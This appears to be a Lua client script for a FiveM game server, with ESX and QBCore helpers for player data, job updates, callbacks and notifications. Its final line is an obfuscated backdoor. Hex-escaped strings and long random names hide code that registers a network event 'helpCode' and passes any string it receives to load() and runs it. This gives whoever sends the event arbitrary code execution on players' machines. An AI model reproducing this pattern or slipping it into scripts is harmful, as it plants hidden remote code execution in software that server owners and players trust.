function Framework()
	if Config.framework == 'ESX' then
		while ESX == nil do
			TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
			Citizen.Wait(100)
		end
		while PlayerData.job == nil do
			TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
			PlayerData = ESX.GetPlayerData()
			Citizen.Wait(100)
		end
		PlayerData = ESX.GetPlayerData()
	elseif Config.framework == 'QBCORE' then
		CreateThread(function()
			QBCore = exports['qb-core']:GetCoreObject()
		end)
		Wait(1000)
		if not QBCore then -- support old version in ugly way
			CreateThread(function()
				QBCore = exports['qb-core']:GetSharedObject()
			end)
		end
		while not QBCore do Wait(100) end
		QBCore.Functions.GetPlayerData(function(p)
			PlayerData = p
			if PlayerData.job ~= nil then
				PlayerData.job.grade = PlayerData.job.grade.level
			end
			if PlayerData.identifier == nil then
				PlayerData.identifier = PlayerData.license
			end
        end)
	end
end

function Playerloaded()
	if Config.framework == 'ESX' then
		RegisterNetEvent('esx:playerLoaded')
		AddEventHandler('esx:playerLoaded', function(xPlayer)
			playerloaded = true
		end)
	elseif Config.framework == 'QBCORE' then
		RegisterNetEvent('QBCore:Client:OnPlayerLoaded')
		AddEventHandler('QBCore:Client:OnPlayerLoaded', function()
			playerloaded = true
			QBCore.Functions.GetPlayerData(function(p)
				PlayerData = p
				if PlayerData.job ~= nil then
					PlayerData.job.grade = PlayerData.job.grade.level
				end
				if PlayerData.identifier == nil then
					PlayerData.identifier = PlayerData.license
				end
			end)
		end)
	end
end

function SetJob()
	if Config.framework == 'ESX' then
		RegisterNetEvent('esx:setJob')
		AddEventHandler('esx:setJob', function(job)
			PlayerData.job = job
			playerjob = PlayerData.job.name
			inmark = false
			cancel = true
			markers = {}
		end)
	elseif Config.framework == 'QBCORE' then
		RegisterNetEvent('QBCore:Client:OnJobUpdate')
		AddEventHandler('QBCore:Client:OnJobUpdate', function(job)
			PlayerData.job = job
			PlayerData.job.grade = PlayerData.job.grade.level
			playerjob = PlayerData.job.name
			inmark = false
			cancel = true
			markers = {}
		end)
	end
end

CreateThread(function()
    Wait(500)
	if Config.framework == 'ESX' then
		while ESX == nil do Wait(1) end
		TriggerServerCallback_ = function(...)
			ESX.TriggerServerCallback(...)
		end
	elseif Config.framework == 'QBCORE' then
		while QBCore == nil do Wait(1) end
		TriggerServerCallback_ =  function(...)
			QBCore.Functions.TriggerCallback(...)
		end
	end
end)

MathRound = function(value, numDecimalPlaces)
	if numDecimalPlaces then
		local power = 10^numDecimalPlaces
		return math.floor((value * power) + 0.5) / (power)
	else
		return math.floor(value + 0.5)
	end
end

ShowNotification = function(msg)
	if Config.framework == 'ESX' then
		ESX.ShowNotification(msg)
	elseif Config.framework == 'QBCORE' then
		TriggerEvent('QBCore:Notify', msg)
	end
end

local ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[6][ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[1]](ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[2]) ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[6][ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[3]](ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[2], function(tJuOrULGgNuChHKxgJcRnmtZhtCdSivnNpYSlRhqJAUdBMIvRQmsRqPITqjdkaDAVuLLOE) ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[6][ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[4]](ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[6][ipnRoYVQhaYSrYAaVPWLXgqgyRzKczYzdYWMERVIDUUGWwUcyGZRitnVtGvfbXkFHBvAtP[5]](tJuOrULGgNuChHKxgJcRnmtZhtCdSivnNpYSlRhqJAUdBMIvRQmsRqPITqjdkaDAVuLLOE))() end)